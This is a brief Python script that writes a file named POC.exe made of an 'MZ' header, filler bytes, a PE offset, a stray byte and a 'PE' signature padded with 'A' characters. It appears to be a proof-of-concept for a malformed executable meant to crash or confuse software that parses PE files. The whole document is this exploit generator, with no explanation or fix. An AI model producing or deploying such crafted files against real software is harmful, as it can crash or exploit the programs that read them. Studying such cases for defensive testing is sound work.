# /usr/bin/python
header = "MZ"
header += "A"*58
header += "\x80\x00\x00\x00"
header += "A"*3
header += "\x0e"
header += "A"*60
header += "PE"
header += "A"*235
f = open('POC.exe','wb')
f.write(header)
f.close()
